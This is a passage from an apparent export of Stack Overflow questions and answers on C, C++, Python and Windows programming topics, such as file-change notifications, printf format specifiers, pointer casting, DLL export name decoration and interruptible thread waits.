        FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL, OPEN_EXISTING, 
        FILE_FLAG_BACKUP_SEMANTICS, NULL );

    if ( m_hMonitoredDir == INVALID_HANDLE_VALUE )
    {
        DWORD dwErr = GetLastError();
        printf(""error"");
        return;
    }

    char szBuf[ MAX_PATH ];
    DWORD dwBytesRead = 0;
    int flag=0;
    char *buffer;

    while ( ReadDirectoryChangesW( m_hMonitoredDir, szBuf, MAX_PATH, FALSE, FILE_NOTIFY_CHANGE_LAST_WRITE,&amp;dwBytesRead, NULL, NULL ))
    {
        PFILE_NOTIFY_INFORMATION pstFileNotif = (PFILE_NOTIFY_INFORMATION)( szBuf );
        if ( pstFileNotif-&gt;Action == FILE_ACTION_MODIFIED ) 
        {
            char szNotifFilename[ MAX_PATH ] = { 0 };
            if ( int iNotifFilenameLen = WideCharToMultiByte( CP_OEMCP, NULL, 
                pstFileNotif-&gt;FileName, 
                pstFileNotif-&gt;FileNameLength / sizeof( WCHAR ), 
                szNotifFilename, sizeof( szNotifFilename ) / sizeof( char ), 
                NULL, NULL ) )
            {

                if ( strcmp(""log.txt"", szNotifFilename ) == 0 )
                {   
                    fseek(fp, 0, SEEK_END);
                    new_size = ftell(fp);   
                    fseek(fp,last_size,SEEK_SET);
                    int size=new_size-last_size;
                    buffer=new char[size+1];
                    fread(buffer,1,size,fp);
                    buffer[size]='\0';
                    printf(""%s"",buffer);
                    free(buffer);
                }
            }
        }
    }

}
</code></pre>

<p>Can anyone help me get notifications as soon as I use fflush in B ?</p>
","9530","","<p>I don't think this is possible.  According to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365465%28v=vs.85%29.aspx"" rel=""nofollow"">the documentation</a> on <code>FILE_NOTIFY_CHANGE_LAST_WRITE</code> (emphasis mine):</p>

<blockquote>
  <p>Any change to the last write-time of files in the watched directory or subtree causes a change notification wait operation to return. <strong>The operating system detects a change to the last write-time only when the file is written to the disk.</strong> For operating systems that use extensive caching, detection occurs only when the cache is sufficiently flushed.</p>
</blockquote>

<p><a href=""http://msdn.microsoft.com/en-us/library/9yky46tz.aspx"" rel=""nofollow""><code>fflush()</code></a> ensures that the file data is passed back to the operating system, but it does not guarantee that the data gets written to the disk, since typically a lot of caching is involved:</p>

<blockquote>
  <p>Buffers are normally maintained by the operating system, which determines the optimal time to write the data automatically to disk: when a buffer is full, when a stream is closed, or when a program terminates normally without closing the stream. The commit-to-disk feature of the run-time library lets you ensure that critical data is written directly to disk rather than to the operating-system buffers.</p>
</blockquote>

<p>As others have said in the comments, you may be better of using named pipes for your goals, since you're only dealing with a single known file.</p>
"
"<p>I have a program where I need to keep some objects that open files on disk list and delete those files after the program is done.  However Python seems to be keeping the file open even though there are no more references to an object that should have it open.  I've been able to recreate the problem with pure file objects below:</p>

<pre><code>import os

filenames = ['a.txt', 'b.txt']
files = [open(f,'w') for f in filenames]
for f_object in files:
    f_object.write(""test"")

del files[:]

for name in filenames:
    os.remove(name)
</code></pre>

<p>When I run this on Windows I get the error </p>

<pre><code>Traceback (most recent call last):
  File "".\file_del.py"", line 11, in &lt;module&gt;
    os.remove(name)
WindowsError: [Error 32] The process cannot access the file because it is being used by another process: 'b.txt'
</code></pre>

<p>Interesting that it is able to delete <code>a.txt</code> without a problem.  What is causing <code>b.txt</code> file to be open even though the references to it are gone?</p>

<p><strong>Update</strong></p>

<p>In the original problem, I don't have access to the files to close them.  Trust me, I would love to close those files.  See the following:</p>

<pre><code>base_uri = 'dem'
out_uri = 'foo.tif'
new_raster_from_base_uri(base_uri, out_uri, 'GTiff', -1, gdal.GDT_Float32)

ds = []
for filename in [out_uri]:
    ds.append(gdal.Open(filename, gdal.GA_Update))
band_list = [dataset.GetRasterBand(1) for dataset in ds]
for band in band_list:
    for row_index in xrange(band.YSize):
        a = numpy.zeros((1, band.XSize))
        band.WriteArray(a, 0, row_index)

for index in range(len(ds)):
    band_list[index] = None
    ds[index] = None

del ds[:]

os.remove(out_uri)
</code></pre>

<p><strong>Update 2</strong></p>

<p>I've marked millimoose's answer as the correct one below since it fixes the issue with the abstracted problem of files that I presented here.  Unfortuantely it didn't work with the GDAL objects I was using.  For future reference, I dug deep and found the undocumented <code>gdal.Dataset.__destroy_swig__(ds)</code> function which seems to at least close the file that the dataset is associated with.  I call that first before deleting the file on disk associated with the datasets and that seems to work.</p>
","9530","","<p>You need to close the files with the <a href=""http://docs.python.org/2/library/stdtypes.html#file.close"" rel=""nofollow""><code>file.close()</code></a> method.  Files do get closed automatically when the garbage collector runs, but when that happens is non-deterministic.</p>

<p>The preferred way of ensuring that files get closed deterministically even in the face of exceptions is with a <code>with</code> statement context manager:</p>

<pre><code>with open('filename') as f:
    # Do file operations on f
    ...

# At this scope, f is now closed, even if an exception was thrown
</code></pre>

<p>If you're on Python 2.5, you must write <code>from __future__ import with_statement</code> at the beginning of your program; if you're on Python 2.6 or later, then that's not necessary.</p>
"
"<p>I'm attempting to write a python implementation of <code>java.util.Properties</code> which has a requirement that unicode characters are written to the output file in the format of <code>\u####</code></p>

<p>(Documentation is here if you are curious, though it isn't important to the question: <a href=""http://docs.oracle.com/javase/6/docs/api/java/util/Properties.html"" rel=""nofollow"">http://docs.oracle.com/javase/6/docs/api/java/util/Properties.html</a>)</p>

<p>I basically need something that passes the following test case</p>

<pre><code>def my_encode(s):
    # Magic

def my_decode(s):
    # Magic

# Easy ones that are solved by .encode/.decode 'unicode_escape'
assert my_decode('\u2603') == u'☃'
assert my_encode(u'☃') == '\\u2603'

# This one also works with .decode('unicode_escape')
assert my_decode('\\u0081') == u'\x81'
# But this one does not quite produce what I want
assert my_encode(u'\u0081') == '\\u0081' # Instead produces '\\x81'
</code></pre>

<p>Note that I've tried <code>unicode_escape</code> and it comes close but doesn't quite satisfy what I want</p>

<p>I've noticed that <code>simplejson</code> does this conversion correctly:</p>

<pre><code>&gt;&gt; simplejson.dumps(u'\u0081')
'""\\u0081""'
</code></pre>

<p>But I'd rather avoid:</p>

<ol>
<li>reinventing the wheel</li>
<li>doing some gross substringing of simplejson's output</li>
</ol>
","9530","","<p>According to the documentation you linked to:</p>

<blockquote>
  <p>Characters less than <code>\u0020</code> and characters greater than <code>\u007E</code> in property keys or values are written as <code>\uxxxx</code> for the appropriate hexadecimal value <code>xxxx</code>.</p>
</blockquote>

<p>So, that converts into Python readily as:</p>

<pre><code>def my_encode(s):
    return ''.join(
        c if 0x20 &lt;= ord(c) &lt;= 0x7E else r'\u%04x' % ord(c)
        for c in s
    )
</code></pre>

<p>For each character in the string, if the code point is between 0x20 and 0x7E, then that character remains unchanged; otherwise, <code>\u</code> followed by the code point encoded as a 4-digit hex number is used.  The expression <code>c for c in s</code> is a <em>generator</em> expression, so we convert that back into a string using <a href=""http://docs.python.org/2/library/stdtypes.html#str.join"" rel=""nofollow""><code>str.join</code></a> on the empty string.</p>

<p>For decoding, you can just use the <code>unicode_escape</code> codec as you mentioned:</p>

<pre><code>def my_decode(s):
    return s.decode('unicode_escape')
</code></pre>
"
"<p>Which library does <code>strlen()</code> belong to? </p>

<p>Does it belong to <code>cstring</code>? or <code>string</code>?</p>

<p>I tried the following code, and it does work:</p>

<pre><code>include &lt;iostream&gt;
using namespace std;
//withou include&lt;string.h&gt;

int main() {
    char * str=""abc"";
    cout&lt;&lt;strlen(str);
}
</code></pre>

<p>I set <code>str</code> equal to 3 and give the right answer 3.</p>

<p>Why does it work without including library string or cstring?</p>

<p>Should I include cstring or string there? string.h?</p>
","9530","","<blockquote>
  <p>Which library does strlen() belong to? Does it belong to cstring? or string?</p>
</blockquote>

<p>Neither.  <code>cstring</code> and <code>string</code> are not <em>libraries</em>, they are <em>header files</em> which define the <em>interface</em> to various functions and classes.</p>

<p>The C language standard says that the <code>strlen</code> function is declared in the header file <code>&lt;string.h&gt;</code>.  In C++, including <code>&lt;string.h&gt;</code> places <code>strlen</code> into the global namespace, while including <code>&lt;cstring&gt;</code> instead places <code>strlen</code> into the <code>std</code> namespace.</p>

<p>The actual <em>implementation</em> of the <code>strlen</code> function is in the C standard library (aka <code>libc</code> or <code>CRT</code> on certain platforms).  Ordinarily, this is linked in with your executable at link time.</p>

<blockquote>
  <p>Why it works without including library string or cstring?</p>
</blockquote>

<p>In your particular compiler and toolchain, it just so happens that the header file <code>&lt;iostream&gt;</code> includes <code>&lt;cstring&gt;</code> into it, which means that any code that includes the former also gets the latter for free.  This is an <strong>implementation detail</strong> and should not be relied upon—if your compile your code with another compiler, you may suddenly find yourself in a sea of compiler errors.</p>

<p>The proper thing to do is to also include <code>&lt;cstring&gt;</code> here; even though it's not necessary with your particular compiler, it may be necessary with other compilers.</p>
"
"<p>I have worked with ""CPPLoadLibrary"" example (from Microsoft All-in-One framework)
Okay, there are two ways of export symbols from the sample DLL. </p>

<ol>
<li>Export symbols from a DLL using .DEF files
A module-definition (.DEF) file is a text file containing one or more module 
statements that describe various attributes of a DLL. Create a .DEF file and 
use the .def file when building the DLL. Using this approach, we can export 
functions from the DLL by ordinal rather than by name. </li>
<li>Export symbols from a DLL using __declspec(dllexport) 
__declspec(dllexport) adds the export directive to the object file so we do 
not need to use a .def file. This convenience is most apparent when trying to
export decorated C++ function names. </li>
</ol>

<p>And so we have the following code.</p>

<pre><code>typedef int     (_cdecl* LPFNGETSTRINGLENGTH1)      (PCWSTR);
typedef int     (CALLBACK* LPFNGETSTRINGLENGTH2)    (PCWSTR);

LPFNGETSTRINGLENGTH1 lpfnGetStringLength1 = (LPFNGETSTRINGLENGTH1) 
    GetProcAddress(hModule, ""GetStringLength1"");

LPFNGETSTRINGLENGTH2 lpfnGetStringLength2 = (LPFNGETSTRINGLENGTH2) 
    GetProcAddress(hModule, ""_GetStringLength2@4"");
</code></pre>

<p>So my question is how to determine the name of symbol in order to call GetProcAddress?
in first case it's pretty straightforward, we take that symbol name from .DEF file.
But what about ""_GetStringLength2@4"" 
What is underscore? What is ""@4"" stand for?
Thanks.</p>
","9530","","<p>If you don't use a .DEF file, the export names are decorated according to their calling convention in order to support exporting overloaded functions.  See <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/12/57833.aspx"" rel=""nofollow"">Why can't I GetProcAddress a function I dllexport'ed?</a>:</p>

<blockquote>
  <p>[T]he decoration scheme varies from architecture to architecture and from calling convention to calling convention. So, for example, if the function is exported from a PPC DLL, you would have to do <code>GetProcAddress(hinst, ""..SomeFunction"")</code>, but if it is exported from an 80386 DLL as <code>extern ""C"" __stdcall</code>, you would need <code>GetProcAddress(hinst, ""_SomeFunction@8"")</code>, but if it's <code>__fastcall</code> you would need <code>GetProcAddress(hinst, ""@SomeFunction@8"")</code>.</p>
  
  <p>What's more, C++ decoration varies from compiler vendor to compiler vendor. A C++ exported function might require <code>GetProcAddress(hinst, ""?SomeFunction@@YGXHH@Z"")</code> if compiled with the Microsoft C++ compiler, but some other decorated string if compiled with the Borland C++ compiler.</p>
  
  <p>So if you intend people to be able to <code>GetProcAddress</code> for functions and you intend your code to be portable to multiple platforms, or if you intend them to be able to use your DLL from a language other than C/C++ or use a C++ compiler different from Microsoft Visual Studio, then you must export the function by its undecorated name.</p>
</blockquote>

<p>See <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/08/48616.aspx"" rel=""nofollow"">The history of calling conventions, part3</a> for a description of the various name decoration schemes.  In this case, the function uses the <code>__stdcall</code> calling convention, so it's decorated by prepending an underscore and appending a <code>@</code> sign and the number of bytes worth of parameters it takes.  It takes one word-sized argument for a total of 4 bytes, so it's decorated as <code>_GetStringLength2@4</code>.</p>
"
"<p>I have a struct that contains a string and a length:</p>

<pre><code>typedef struct string {
  char* data;
  size_t len;
} string_t;
</code></pre>

<p>Which is all fine and dandy.  But, I want to be able to output the contents of this struct using a <code>printf</code>-like function.  <code>data</code> may not have a nul terminator (or have it in the wrong place), so I can't just use <code>%s</code>.  But the <code>%.*s</code> specifier requires an <code>int</code>, while I have a <code>size_t</code>.</p>

<p>So the question now is, how can I output the string using <code>printf</code>?</p>
","9530","","<p>Assuming that your string doesn't have any embedded NUL characters in it, you can use the <code>%.*s</code> specifier after casting the <code>size_t</code> to an <code>int</code>:</p>

<pre><code>string_t *s = ...;
printf(""The string is: %.*s\n"", (int)s-&gt;len, s-&gt;data);
</code></pre>

<p>That's also assuming that your string length is less than <code>INT_MAX</code>.  If you have a string longer than <code>INT_MAX</code>, then you have other problems (it will take quite a while to print out 2 billion characters, for one thing).</p>
"
"<p>Runing Backtrace, It shows an error. What does the hexadecimal number represent at the end of a this line:</p>

<pre class=""lang-none prettyprint-override""><code>======= Backtrace: =========
/lib64/libc.so.6(__cxa_finalize+0x8e)[0x323aa337de]
</code></pre>
","9530","","<p>The address at the end (<code>0x323aa337de</code>) is value of the program counter (the RIP register on x86-64).  According to your debug symbols, this address is equal to <code>__cxa_finalize+0x8e</code>, i.e. 0x8e bytes past the start of the <code>__cxa_finalize</code> function within the C runtime shared library (<code>/lib64/libc.so.6</code>).</p>
"
"<p>I have a function that takes a <code>void**</code> argument and an integer that indicates its datatype</p>

<pre><code>void foo (void** values, int datatype)
</code></pre>

<p>Inside the function, depending on the datatype, I malloc it this way:</p>

<pre><code>if (datatype == 1)
    *values = (int*) malloc (5 * sizeof(int));
else if (datatype == 2)
    *values = (float*) malloc (5 * sizeof(float));
</code></pre>

<p>All is good upto now. However, when character strings come into the picture, things get complicated. The <code>void**</code> would need to be <code>void***</code>, since I will need to do something like this:</p>

<pre><code>*values = (char**) malloc (5 * sizeof(char*));
for(i=0;i&lt;5;i++)
    (*values)[i] = (char*) malloc (10);
..
strncpy( (*values)[0], ""hello"", 5);
</code></pre>

<p>How should such a situation be handled? 
Can I pass a <code>char***</code> to the function that expects a <code>void**</code> but cast it correctly inside it?</p>

<pre><code>void foo (void** values, int datatype) {

if(datatype == 3) {
    char*** tmp_vals = (char***) values;
    *tmp_vals = (char**) malloc (5 * sizeof(char*));
    ...
    (*tmp_vals)[i] = (char*) malloc (10 * sizeof(char));
    strncpy (  (*tmp_vals)[i], ""hello"", 5);
}
</code></pre>

<p>So I just cast the <code>void**</code> into a <code>char***</code>. I tried this and ignoring the warnings, it worked fine.
But is this safe? Is there a more graceful alternative?</p>
","9530","","<blockquote>
  <p>How should such a situation be handled? Can I pass a <code>char***</code> to the function that expects a <code>void**</code> but cast it correctly inside it?</p>
</blockquote>

<p>No, that's technically Undefined Behavior.  It may appear to work on your computer, but it may fail on some future computer that implements different pointer types with different representations, which is allowed by the C language standard.</p>

<p>If your function expects a <code>void**</code>, then you better pass it a <code>void**</code>.  Any pointer type can be implicitly converted to <code>void*</code>, but that only works at the top level: <code>char*</code> can be converted to <code>void*</code>, and <code>char**</code> can be implicitly converted to <code>void*</code> (because <code>char**</code> is ""pointer to <code>char*</code>""), but <code>char**</code> <em>cannot</em> be converted to <code>void**</code>, and likewise <code>char***</code> also <em>cannot</em> be converted to <code>void**</code>.</p>

<p>The proper way to call this function is to pass it a proper <code>void**</code>, then cast the resulting <code>void*</code> pointer back to its original type:</p>

<pre><code>void foo(void **values, int datatype)
{
    if(datatype == 3)
    {
        char ***str_values = ...;
        *values = str_values;  // Implicit cast from char*** to void*
    }
    else
    ...
}

...

void *values;
foo(&amp;values, 2);
char ***real_values = (char ***)values;
</code></pre>

<p>Assuming that <code>*values</code> was actually pointed to a <code>char***</code>, then this cast is valid and does not have any Undefined Behavior in any of the code paths.</p>
"
"<p>Trying to make sense of MTAudioProcessingTap sample code from WWDC 2012.</p>

<p>This structure is used by the Tap to pass data around. </p>

<pre><code>typedef struct AVAudioTapProcessorContext {
    ...
    void *self; //Note use of word self
} AVAudioTapProcessorContext;
</code></pre>

<p>The word <code>self</code> here is used apparently as a standard variable name even though Xcode highlights it in pink. Is this just a code parsing oversight in Xcode?</p>

<p>Later, the Tap management class passes a reference to itself to this variable.</p>

<pre><code>//Setting up Tap callbacks:
callbacks.clientInfo = (__bridge void *)self,

//And then storing it in the above struct when it's passed by the callback:
static void tap_InitCallback(MTAudioProcessingTapRef tap, void *clientInfo, void **tapStorageOut)
{
    AVAudioTapProcessorContext *context = calloc(1, sizeof(AVAudioTapProcessorContext));

    ...
    context-&gt;self = clientInfo;

    *tapStorageOut = context;
}
</code></pre>

<p>And the confusion starts again in a later function (another Tap callback). Once again, the word self is used to refer to the Tap management class reference. Note that this occurs in a function defined after <code>@end</code> of the Tap management class implementation.</p>

<pre><code>AudioFFTTapProcessor *self = ((__bridge AudioFFTTapProcessor *)context-&gt;self);
</code></pre>
","9530","","<p><code>self</code> has a special meaning <em>only</em> in the context of an Objective-C method.  In all other contexts, it's just an ordinary identifier.  You can think of Objective-C methods as being rewritten to take a hidden parameter with the name <code>self</code> (and a second hidden parameter named <code>_cmd</code> that's not relevant for this discussion), e.g.:</p>

<pre><code>@implementation MyClass

- (void)doSomething:(int)param1 withThis:(NSString *)param2
{
    // 'self' refers to the MyClass instance in this function
    ...
}
@end
</code></pre>

<p>could be imagined as if it were rewritten like this:</p>

<pre><code>void MyClass_doSomething(id self, SEL _cmd, int param1, NSString *param2)
{
    // 'self' refers to the MyClass instance in this function
    ...
}
</code></pre>

<p>Outside of Objective-C methods, you can use <code>self</code> as any other kind of identifier, whether it be a local variable, a <code>struct</code> member, a global function, or type name, etc., though the latter uses should be highly discouraged due to high potential for confusion.</p>

<p>So yes, XCode highlighting the <code>self</code> instance in pink in the <code>struct</code> definition is just a parsing anomaly.</p>
"
"<p>I have string <strong>gitproject</strong></p>

<p>How can I use sed command with <em>gitproject argument</em> in order to do:</p>

<ul>
<li><code>http://user_name:user_password@example.com/gitproject.git</code></li>
<li><code>http://example.com/gitproject.git</code></li>
</ul>

<p>BR</p>
","9530","","<p>You can use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"" rel=""nofollow""><code>${VARIABLE_NAME}</code> syntax</a> to expand a shell variable without adding any extra whitespace on either side, e.g.:</p>

<pre><code>proj=gitproject
echo http://user_name_userpassword@example.com/${proj}.git
echo http://example.com/${proj}.git
</code></pre>
"
"<p>First, let me clarify that I know passing pointers as arguments to these <code>printf</code> specifiers is not correct. I am interested however in knowing what is going on in <code>printf</code> when it is done.  </p>

<p>Using the <em>normal</em> print specifiers, <code>%d</code> for <code>int</code>, and <code>%f</code> for <code>float</code>, why is it the <code>int *</code> prints, while the <code>float *</code> will not?  </p>

<p>For example, given these variables (unitialized):  </p>

<pre><code>int a, *pA;
float b, *pB;

pA = &amp;a;  
pB = &amp;b;
</code></pre>

<p>When called like this:  </p>

<pre><code>void printVar(int *a, float *b)
{
    printf(""%d\n"", a);//why does ""a"" print at all?
    printf(""%d  %p\n"",   a,  b);// when ""b"" prints only using %p
    //printf(""%d  %f"", a,  b);// but fails on parameter mismatch using %f
    printf(""%d  %f\n""  ,  *a, *b);// prints normally (as expected)
}
</code></pre>

<p>Why do I get this?:    (""a"" prints OK, but ""b"" prints only with %p or by passing *b)</p>

<p><img src=""http://i.stack.imgur.com/DmLOb.jpg"" alt=""enter image description here""></p>

<p><em><strong>[edit]</em></strong>  entire code to clarify and address some of the comment questions:</p>

<pre><code>#include &lt;ansi_c.h&gt;

void printVar(int *a, float *b)
{
    printf(""%d\n"", a);//why does ""a"" print at all?
    printf(""%d  %p\n"",   a,  b);// when ""b"" prints only using %p
    //printf(""%d  %f"", a,  b);// but fails on parameter mismatch using %f
    printf(""%d  %f\n""  ,  *a, *b);// prints normally (as expected)
}

int main()
{
    int a, *pA;
    float b, *pB;
    char s[100], *pS;

    pA = &amp;a;
    pB = &amp;b;
    pS = &amp;s[0];

    printVar(pA, pB);

    getchar();

    return 0;
}
</code></pre>

<p><em>*</em>[edit 2] addressing some comments about actual content if uncomment 3rd printf</p>

<p>I get the following two run-time notices, then get no output for the printf in line 3:<br>
<img src=""http://i.stack.imgur.com/coBjM.jpg"" alt=""enter image description here""><br>
<img src=""http://i.stack.imgur.com/I3xAr.jpg"" alt=""enter image description here""></p>
","9530","","<p>It's quite simple -- because the argument types don't match the expected types from the format string, you get Undefined Behavior.  Anything at all could happen, so nothing should be surprising.</p>

<p>Several calling conventions don't pass floating-point parameters on the stack; rather, they pass them through special floating-point registers, e.g. the x87 stack or SSE registers.  So when <code>printf</code> sees a <code>%f</code> format specifier, it tries to read a floating-point value from those locations, but when it sees a <code>%d</code> format specifier, it tries to read an integer off the stack.  When you pass in a pointer instead, the compiler passes that on the stack.</p>

<p>For example, here's a simple function:</p>

<pre><code>void printVars(float a, float *p)
{
  printf(""%f\n"", a);
  printf(""%p\n"", p);
}
</code></pre>

<p>And here's an annotated version of its disassembly on my x86-64 system, which passes floating-point values using the SSE registers <code>%xmm0</code> etc.:</p>

<pre><code>00000000004004f4 &lt;printVars&gt;:
  ;;; Function prologue
  4004f4:   55                      push   %rbp
  4004f5:   48 89 e5                mov    %rsp,%rbp
  4004f8:   48 83 ec 10             sub    $0x10,%rsp

  ;;; Set up floating-point argument in %xmm0 register
  4004fc:   f3 0f 11 45 fc          movss  %xmm0,-0x4(%rbp)
  400501:   48 89 7d f0             mov    %rdi,-0x10(%rbp)
  400505:   f3 0f 10 45 fc          movss  -0x4(%rbp),%xmm0
  40050a:   0f 5a c0                cvtps2pd %xmm0,%xmm0
  ;;; Set up format string argument (%rdi) and call printf
  40050d:   b8 3c 06 40 00          mov    $0x40063c,%eax
  400512:   48 89 c7                mov    %rax,%rdi
  400515:   b8 01 00 00 00          mov    $0x1,%eax
  40051a:   e8 d1 fe ff ff          callq  4003f0 &lt;printf@plt&gt;

  ;;; Set up format string argument (%rdi) and pointer argument (%rsi) amd
  ;;; call printf
  40051f:   b8 40 06 40 00          mov    $0x400640,%eax
  400524:   48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400528:   48 89 d6                mov    %rdx,%rsi
  40052b:   48 89 c7                mov    %rax,%rdi
  40052e:   b8 00 00 00 00          mov    $0x0,%eax
  400533:   e8 b8 fe ff ff          callq  4003f0 &lt;printf@plt&gt;

  ;;; Function epilogue
  400538:   c9                      leaveq 
  400539:   c3                      retq 
</code></pre>
"
"<p>this is the data structure type question i have a problem with the tree i want to take input from user say its name. ""DAN"" now i want to make a tree for that with root node having three children.
i have a tree having three children.</p>

<p>how i will implement it with linked list. because in binary tree linked list has two children.</p>

<p>but here i have three. simple is that i have a root node having three children </p>

<pre><code>                root
                / | \
               /  |  \
             ch1 ch2  ch3
</code></pre>
","9530","","<p>Simple, you create a structure with three children pointers:</p>

<pre><code>struct TreeNode
{
    int data;
    TreeNode *children[3];
};
</code></pre>

<p>Alternatively, you can turn the children into a linked list, so that any given node only has a direct pointer to its first child as well as its first sibling:</p>

<pre><code>struct TreeNode
{
    int data;
    TreeNode *firstChild;
    TreeNode *nextSibling;
};

// To iterate through the children of a node:
TreeNode *child = root-&gt;firstChild;
while (child != NULL)
{
    // Do stuff with child
    ...
    child = child-&gt;nextSibling;
}
</code></pre>

<p>This extends more easily to any number of children, but it has higher performance penalties when accessing data.  So if you know that each node will have at most 3 children, it's better to use a fixed array of child pointers to improve access times and improve cache locality.</p>
"
"<p>Why would the following not work when i is defined in the for loop </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;
int N;
long long int H() {

    long long int ans=0;
    int i, lt;

    if(N &lt;= 0)
        return 0;

    for(i=1, lt=sqrt(N); i&lt;=lt; i+=1) /* if i=1 is replaced by int i=1 =&gt; garbage */
        ans+=(N/i);

    ans = 2*ans-(lt*lt);
    return ans;

}
int main() {

    scanf(""%d"",&amp;N);
    printf(""%lld\n"",H());

    return 0;
}
</code></pre>

<p>output when it's defined at the top </p>

<pre><code>Input: 8
Output: 20
</code></pre>

<p>output when it's defined in the for loop <code>/* for (int i=1 ..) */</code></p>

<pre><code>Input: 8
Output: 1243068212
</code></pre>

<p>I see that I get a warning <code>lt is initialized when used here</code>, why?</p>
","9530","","<p>When you write this:</p>

<pre><code>int lt;
for (int i=1, lt=sqrt(N); ...)
</code></pre>

<p>That defines <strong>two</strong> new inner variables named <code>i</code> and <code>lt</code>; in particular, the new <code>lt</code> variable <em>shadows</em> the outer one, making it temporarily inaccessible within the inner scope.  So, the outer <code>lt</code> variable never gets initialized, and when you compute <code>ans = 2*ans-(lt*lt)</code>, it's using that uninitialized value to compute the result.</p>
"
"<p>I met a behaviour I don't understand.
I want fun to return a 2 byte val.
I create a 4 byte var to do some processing and return the variable.
My assumption is the variable is implicitly converted to short.
However, it appears that the returned value isnt rly 2 byte, because the printf fun prints a value greater than 2^16 unless I place (short) before fun().
Why is that?</p>

<pre><code>short fun()
{
long var = 2&lt;&lt;20;
return var;
}

printf(""%i"", fun());
</code></pre>
","9530","","<p>Variadic functions such as <code>printf</code> perform what are called the <em>default argument promotions</em> on their operands.  In particular, integers narrower than <code>int</code> (such as <code>short</code>) automatically get widened to <code>int</code> when they are passed into variadic functions.</p>

<p>One way to get around this is to use the <code>h</code> length modifier which says ""even though you're dealing with an <code>int</code> value, pretend that it's really a <code>short</code>"".  Then, <code>printf</code> will narrow the value back to <code>short</code> before formatting the output.  For example:</p>

<pre><code>printf(""%hi"", fun());
</code></pre>
"
"<p>I have been told by more senior, experienced and better-educated programmers than myself that the use of <a href=""/questions/tagged/function-pointers"" class=""post-tag"" title=""show questions tagged 'function-pointers'"" rel=""tag"">function-pointers</a> in <a href=""/questions/tagged/c"" class=""post-tag"" title=""show questions tagged 'c'"" rel=""tag"">c</a> should be avoided.  I have seen the fact that some code contains function pointers as a rationale not to re-use that code, even when the only alternative is complete re-implementation.  Upon further discussion I haven't been able to determine why this would be.  I am happy to use function pointers where appropriate, and like the interesting and powerful things they allow you to do, but am I throwing caution to the wind by using them?</p>

<p>I see the pros and cons of function pointers as follows:</p>

<p>Pros:</p>

<ol>
<li>Great opportunity for code modularity</li>
<li>OO-like features in non-OO c (i.e. code and data in the same object)</li>
<li>How else could you reasonably implement a callback?</li>
</ol>

<p>Cons:</p>

<ol>
<li>Negative impact to code readability - not always obvious what function is actually called when a function pointer is invoked</li>
<li>Minor performance hit compared to a direct function call</li>
</ol>

<p>I think Con # 1. can usually reasonably be mitigated by well chosen symbol names and good comments.  And Con # 2. will in general not be a big deal.  Am I missing something - are there other reasons to avoid function pointers like the plague?</p>

<p><em>This question looks a little discussion-ey, but I'm looking for good reasons why I shouldn't use function pointers, not opinions</em></p>
","9530","","<p>No, they're not evil.  They're absolute necessary in order to implement various features such as callback functions in C.</p>

<p>Without function pointers, you could not implement:</p>

<ul>
<li><a href=""http://linux.die.net/man/3/qsort"" rel=""nofollow""><code>qsort(3)</code></a></li>
<li><a href=""http://linux.die.net/man/3/bsearch"" rel=""nofollow""><code>bsearch(3)</code></a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633570%28v=vs.85%29.aspx"" rel=""nofollow"">Window procedures</a></li>
<li><a href=""http://man7.org/linux/man-pages/man3/pthread_create.3.html"" rel=""nofollow"">Threads</a></li>
<li><a href=""http://linux.die.net/man/2/signal"" rel=""nofollow"">Signal handlers</a></li>
</ul>

<p>And many more.</p>
"
"<p>I keep running into this problem of trying to run a thread with the following properties:</p>

<ol>
<li>runs in an infinite loop, checking some external resource, e.g. data from the network or a device,</li>
<li>gets updates from its resource promptly,</li>
<li>exits promptly when asked to,</li>
<li>uses the CPU efficiently.</li>
</ol>

<h2>First approach</h2>

<p>One solution I have seen for this is something like the following:</p>

<pre><code>void class::run()
{
    while(!exit_flag)
    {
        if (resource_ready)
            use_resource();
    }
}
</code></pre>

<p>This satisfies points 1, 2 and 3, but being a busy waiting loop, uses 100% CPU.</p>

<h2>Second approach</h2>

<p>A potential fix for this is to put a sleep statement in:</p>

<pre><code>void class::run()
{
    while(!exit_flag)
    {
        if (resource_ready)
            use_resource();
        else
            sleep(a_short_while);
    }
}
</code></pre>

<p>We now don't hammer the CPU, so we address 1 and 4, but we could wait up to <code>a_short_while</code> unnecessarily when the resource is ready or we are asked to quit.</p>

<h2>Third approach</h2>

<p>A third option is to do a blocking read on the resource:</p>

<pre><code>void class::run()
{
    while(!exit_flag)
    {
        obtain_resource();
        use_resource();
    }
}
</code></pre>

<p>This will satisfy 1, 2, and 4 elegantly, but now we can't ask the thread to quit if the resource does not become available.</p>

<h2>Question</h2>

<p>The best approach seems to be the second one, with a short sleep,  so long as the tradeoff between CPU usage and responsiveness can be achieved.
However, this still seems suboptimal, and inelegant to me.  This seems like it would be a common problem to solve.  Is there a more elegant way to solve it?  Is there an approach which can address all four of those requirements?</p>
","9530","","<p>This depends on the specifics of the resources the thread is accessing, but basically to do it efficiently with minimal latency, the resources need to provide an API for either doing an interruptible blocking wait.</p>

<p>On POSIX systems, you can use the <a href=""http://linux.die.net/man/2/select""><code>select(2)</code></a> or <a href=""http://linux.die.net/man/2/poll""><code>poll(2)</code></a> system calls to do that, if the resources you're using are files or file descriptors (including sockets).  To allow the wait to be preempted, you also create a dummy pipe which you can write to.</p>

<p>For example, here's how you might wait for a file descriptor or socket to become ready or for the code to be interrupted:</p>

<pre><code>// Dummy pipe used for sending interrupt message
int interrupt_pipe[2];
int should_exit = 0;

void class::run()
{
    // Set up the interrupt pipe
    if (pipe(interrupt_pipe) != 0)
        ;  // Handle error

    int fd = ...;  // File descriptor or socket etc.
    while (!should_exit)
    {
        // Set up a file descriptor set with fd and the read end of the dummy
        // pipe in it
        fd_set fds;
        FD_CLR(&amp;fds);
        FD_SET(fd, &amp;fds);
        FD_SET(interrupt_pipe[1], &amp;fds);
        int maxfd = max(fd, interrupt_pipe[1]);

        // Wait until one of the file descriptors is ready to be read
        int num_ready = select(maxfd + 1, &amp;fds, NULL, NULL, NULL);
        if (num_ready == -1)
            ; // Handle error

